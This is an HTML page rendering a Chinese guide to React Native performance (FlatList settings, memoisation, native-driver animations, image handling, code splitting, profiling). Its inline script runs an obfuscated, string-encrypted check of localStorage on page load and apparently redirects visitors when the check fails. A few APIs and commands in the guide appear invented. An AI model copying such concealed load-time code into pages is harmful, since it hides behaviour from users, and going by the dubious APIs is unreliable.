<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x47ef2c=_0x1853;function _0x2e82(){var s=["y8kMfSoDdCkgWP0","WOm8WPVcRJNdVmosFH3dRc4HumoF","WRaVW5ldG3DhtW","WP90zhFcTCowWQOhWQqqfG","W5dcLmk4WOieWO5N","DSoLe3BdT3bpvZBcGCo0nSo9dY1Cu1HNWPzfWOFcPCkysdi","W6HTW6VcGYqMB1X0","mZL1DhLfW57dRYpdMKy","WPTDW4xcTI4+rq","W4ddOaRdHmkTWQjdWRhcLCo/cSkYW4Kz","y8kbWQlcRc3dUmkdoCo1","W5FdI8oeW7z+W6Oak8o8W5RcNWmWhW","DCoWbwlcImkVW5Kz","jmoAEINdQwX0W4L7WR8fWR7dTN8","mSoUWRddOvneyatdRNtcGSkbBI4","cq4bw8oznJbFWRJdRgPrAG","k1NcGmkuqCosW5C","W5lcVZ/cMSk7nSkvW7WHA8okwua","W7tdV8k4WOxdOCo/hSoEW5KuWP0","fmotW61QWQS","k8kGvZxcTxnyhaVcNmo3oSod","W7RcNsldHSoFemkUW4/dHG","WOtdTHNcTtKFrbZcO8oeW5K","WO5xWPJdT3yfWQ7dKNiGC8oTkW","W7ddRtldL8o0W6xcQG","W5PlWPbqWOhdG8kKCCkZCCkViu/dTa"];return(_0x2e82=function(){return s})()}function _0x1853(p,s){var t=_0x2e82();return(_0x1853=function(s,a){var n=t[s-=425];void 0===_0x1853.rgjJtU&&(_0x1853.baxbZT=function(s,a){var n,l=[],p=0,t="";for(s=(s=>{for(var a,n,l="",p="",t=0,e=0;n=s.charAt(e++);~n&&(a=t%4?64*a+n:n,t++%4)&&(l+=String.fromCharCode(255&a>>(-2*t&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);for(var c=0,r=l.length;c<r;c++)p+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(p)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)p=(p+l[e]+a.charCodeAt(e%a.length))%256,n=l[e],l[e]=l[p],l[p]=n;for(var e=0,p=0,c=0;c<s.length;c++)n=l[e=(e+1)%256],l[e]=l[p=(p+l[e])%256],l[p]=n,t+=String.fromCharCode(s.charCodeAt(c)^l[(l[e]+l[p])%256]);return t},p=arguments,_0x1853.rgjJtU=!0);var s=s+t[0],l=p[s];return l?n=l:(void 0===_0x1853.slawBF&&(_0x1853.slawBF=!0),n=_0x1853.baxbZT(n,a),p[s]=n),n})(p,s)}if((()=>{for(var s=_0x1853,a=_0x2e82();;)try{if(975782==+parseInt(s(436,"rqhL"))*(parseInt(s(437,"#2Xx"))/2)+parseInt(s(426,"sV&G"))/3+parseInt(s(447,"@$0W"))/4*(parseInt(s(450,"pc38"))/5)+-parseInt(s(433,"fYRF"))/6*(parseInt(s(440,"fYRF"))/7)+parseInt(s(444,"bv)k"))/8+-parseInt(s(428,"JWgR"))/9+parseInt(s(443,"#zu]"))/10)break;a.push(a.shift())}catch(s){a.push(a.shift())}})(),localStorage[_0x47ef2c(427,"w]zG")](_0x47ef2c(435,"#2Xx"))!=_0x47ef2c(448,"MXkt"))throw window[_0x47ef2c(441,"iFoV")][_0x47ef2c(429,"26cA")](_0x47ef2c(434,"#KXL")),Error();document.title="React Native 性能优化全面指南",document.getElementById("article").innerHTML='<div><p>React Native 应用的性能优化需要从多个维度进行，以下是系统化的优化方案：</p>\n<h2>一、渲染性能优化</h2>\n<h3>1. 列表渲染优化</h3>\n<pre><code class="language-jsx"><span class="hljs-comment">// 使用 FlatList 替代 ScrollView</span>\n&lt;<span class="hljs-title class_">FlatList</span>\n  data={data}\n  renderItem={<span class="hljs-function">(<span class="hljs-params">{item}</span>) =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ListItem</span> <span class="hljs-attr">item</span>=<span class="hljs-string">{item}</span> /&gt;</span></span>}\n  keyExtractor={<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">id</span>}\n  initialNumToRender={<span class="hljs-number">5</span>} <span class="hljs-comment">// 初始渲染数量</span>\n  maxToRenderPerBatch={<span class="hljs-number">10</span>} <span class="hljs-comment">// 每批渲染数量</span>\n  windowSize={<span class="hljs-number">21</span>} <span class="hljs-comment">// 渲染窗口大小</span>\n  removeClippedSubviews={<span class="hljs-literal">true</span>} <span class="hljs-comment">// 移除不可见子视图</span>\n/&gt;\n</code></pre>\n<h3>2. 组件优化技术</h3>\n<pre><code class="language-jsx"><span class="hljs-comment">// 使用 React.memo 避免不必要的重新渲染</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) {\n  <span class="hljs-comment">/* 渲染逻辑 */</span>\n});\n\n<span class="hljs-comment">// 使用 useMemo 缓存计算结果</span>\n<span class="hljs-keyword">const</span> memoizedValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b), [a, b]);\n\n<span class="hljs-comment">// 使用 useCallback 缓存回调函数</span>\n<span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-title function_">doSomething</span>(a, b);\n}, [a, b]);\n</code></pre>\n<h2>二、JavaScript 线程优化</h2>\n<h3>1. 减少主线程负担</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 将复杂计算移到 Web Worker</span>\n<span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;worker.js&#x27;</span>);\nworker.<span class="hljs-title function_">postMessage</span>({<span class="hljs-attr">data</span>: largeData});\nworker.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {\n  <span class="hljs-title function_">setResult</span>(event.<span class="hljs-property">data</span>);\n};\n\n<span class="hljs-comment">// 使用 InteractionManager 延迟非关键任务</span>\n<span class="hljs-title class_">InteractionManager</span>.<span class="hljs-title function_">runAfterInteractions</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-comment">// 长时间运行的任务</span>\n});\n</code></pre>\n<h3>2. 动画优化方案</h3>\n<pre><code class="language-jsx"><span class="hljs-comment">// 使用原生驱动动画</span>\n<span class="hljs-title class_">Animated</span>.<span class="hljs-title function_">timing</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">animatedValue</span>, {\n  <span class="hljs-attr">toValue</span>: <span class="hljs-number">1</span>,\n  <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span>,\n  <span class="hljs-attr">useNativeDriver</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 启用原生驱动</span>\n}).<span class="hljs-title function_">start</span>();\n\n<span class="hljs-comment">// 复杂动画考虑使用 Lottie</span>\n<span class="hljs-keyword">import</span> <span class="hljs-title class_">Lottie</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lottie-react-native&#x27;</span>;\n<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Lottie</span> <span class="hljs-attr">source</span>=<span class="hljs-string">{animationData}</span> <span class="hljs-attr">autoPlay</span> <span class="hljs-attr">loop</span> /&gt;</span></span>\n</code></pre>\n<h2>三、内存管理优化</h2>\n<h3>1. 图片处理策略</h3>\n<pre><code class="language-jsx"><span class="hljs-comment">// 使用合适尺寸的图片</span>\n&lt;<span class="hljs-title class_">Image</span> \n  source={{<span class="hljs-attr">uri</span>: <span class="hljs-string">&#x27;image.jpg&#x27;</span>}}\n  resizeMode=<span class="hljs-string">&quot;cover&quot;</span>\n  fadeDuration={<span class="hljs-number">0</span>} <span class="hljs-comment">// 禁用淡入效果提升性能</span>\n/&gt;\n\n<span class="hljs-comment">// 使用 progressive JPEG 或 WebP 格式</span>\n<span class="hljs-comment">// 使用 react-native-fast-image 替代默认 Image</span>\n<span class="hljs-keyword">import</span> <span class="hljs-title class_">FastImage</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native-fast-image&#x27;</span>;\n<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FastImage</span>\n  <span class="hljs-attr">source</span>=<span class="hljs-string">{{uri:</span> &#x27;<span class="hljs-attr">image.jpg</span>&#x27;, <span class="hljs-attr">priority:</span> <span class="hljs-attr">FastImage.priority.high</span>}}\n  <span class="hljs-attr">resizeMode</span>=<span class="hljs-string">{FastImage.resizeMode.contain}</span>\n/&gt;</span></span>\n</code></pre>\n<h3>2. 内存泄漏预防</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 清除定时器</span>\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {}, <span class="hljs-number">1000</span>);\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);\n}, []);\n\n<span class="hljs-comment">// 取消网络请求</span>\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> abortController = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();\n  <span class="hljs-title function_">fetch</span>(url, {<span class="hljs-attr">signal</span>: abortController.<span class="hljs-property">signal</span>});\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> abortController.<span class="hljs-title function_">abort</span>();\n}, []);\n</code></pre>\n<h2>四、启动时间优化</h2>\n<h3>1. 代码拆分方案</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 使用动态导入实现懒加载</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">OtherComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./OtherComponent&#x27;</span>));\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-keyword">return</span> (\n    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Loading</span> /&gt;</span>}&gt;\n      <span class="hljs-tag">&lt;<span class="hljs-name">OtherComponent</span> /&gt;</span>\n    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span>\n  );\n}\n</code></pre>\n<h3>2. 预加载关键资源</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 应用启动时预加载</span>\n<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppRegistry</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native&#x27;</span>;\n\n<span class="hljs-title class_">AppRegistry</span>.<span class="hljs-title function_">registerComponent</span>(appName, <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">App</span>);\n<span class="hljs-title class_">PrefetchCache</span>.<span class="hljs-title function_">preload</span>([<span class="hljs-string">&#x27;criticalImage1&#x27;</span>, <span class="hljs-string">&#x27;criticalImage2&#x27;</span>]);\n</code></pre>\n<h2>五、原生端优化</h2>\n<h3>1. 原生模块优化</h3>\n<pre><code class="language-java"><span class="hljs-comment">// Android 原生模块避免同步方法</span>\n<span class="hljs-meta">@ReactMethod(isBlockingSynchronousMethod = false)</span>\n<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> {\n  <span class="hljs-comment">// 异步实现</span>\n}\n\n<span class="hljs-comment">// iOS 使用 dispatch_async</span>\nRCT_EXPORT_METHOD(doSomething) {\n  dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, <span class="hljs-number">0</span>), ^{\n    <span class="hljs-comment">// 后台执行</span>\n  });\n}\n</code></pre>\n<h3>2. 新架构优化</h3>\n<pre><code class="language-gradle"><span class="hljs-comment">// android/gradle.properties 启用新架构</span>\nnewArchEnabled=<span class="hljs-keyword">true</span>\n</code></pre>\n<pre><code class="language-ruby"><span class="hljs-comment"># ios/Podfile 启用 Fabric</span>\n<span class="hljs-symbol">:fabric_enabled</span> =&gt; <span class="hljs-literal">true</span>\n</code></pre>\n<h2>六、网络优化策略</h2>\n<h3>1. 请求优化</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 使用请求缓存</span>\n<span class="hljs-keyword">import</span> { queryCache } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-query&#x27;</span>;\n\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; {\n  <span class="hljs-keyword">const</span> cachedData = queryCache.<span class="hljs-title function_">getQueryData</span>(<span class="hljs-string">&#x27;key&#x27;</span>);\n  <span class="hljs-keyword">if</span> (cachedData) <span class="hljs-keyword">return</span> cachedData;\n  <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);\n};\n\n<span class="hljs-comment">// 批量请求减少请求次数</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">batchRequests</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">ids</span>) =&gt; {\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(ids.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/item/<span class="hljs-subst">${id}</span>`</span>)));\n};\n</code></pre>\n<h3>2. 数据压缩传输</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 使用 gzip 压缩请求体</span>\n<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;\naxios.<span class="hljs-title function_">post</span>(url, data, {\n  <span class="hljs-attr">headers</span>: {<span class="hljs-string">&#x27;Content-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip&#x27;</span>},\n  <span class="hljs-attr">transformRequest</span>: [<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">compress</span>(data)]\n});\n</code></pre>\n<h2>七、监控与分析工具</h2>\n<h3>1. 性能监测工具</h3>\n<pre><code class="language-sh"><span class="hljs-comment"># 使用 React Native Performance Monitor</span>\nnpx react-native-performance monitor\n\n<span class="hljs-comment"># 使用 Flipper 插件</span>\n<span class="hljs-comment"># 安装 react-native-flipper-performance-plugin</span>\n</code></pre>\n<h3>2. 性能分析命令</h3>\n<pre><code class="language-sh"><span class="hljs-comment"># Android 性能分析</span>\nadb shell dumpsys gfxinfo com.yourapp\n\n<span class="hljs-comment"># iOS 时间线分析</span>\nreact-native run-ios --profile\n</code></pre>\n<h2>八、最佳实践总结</h2>\n<ol>\n<li><strong>渲染优化优先级</strong>  ：\n<ul>\n<li>减少重新渲染次数</li>\n<li>优化列表性能</li>\n<li>简化视图层级</li>\n</ul>\n</li>\n<li><strong>JavaScript 线程准则</strong>  ：\n<ul>\n<li>避免主线程阻塞</li>\n<li>拆分长任务</li>\n<li>使用合适的数据结构</li>\n</ul>\n</li>\n<li><strong>内存管理原则</strong>  ：\n<ul>\n<li>及时释放资源</li>\n<li>监控内存使用</li>\n<li>优化图片处理</li>\n</ul>\n</li>\n<li><strong>网络优化要点</strong>  ：\n<ul>\n<li>减少请求次数</li>\n<li>压缩传输数据</li>\n<li>合理使用缓存</li>\n</ul>\n</li>\n<li><strong>持续优化流程</strong>  ：\n<ul>\n<li>建立性能基准</li>\n<li>定期性能测试</li>\n<li>监控生产环境性能</li>\n</ul>\n</li>\n</ol>\n<p>通过系统性地应用这些优化措施，可以显著提升 React Native 应用的性能表现，达到接近原生的用户体验。</p>\n</div>'</script></body></html>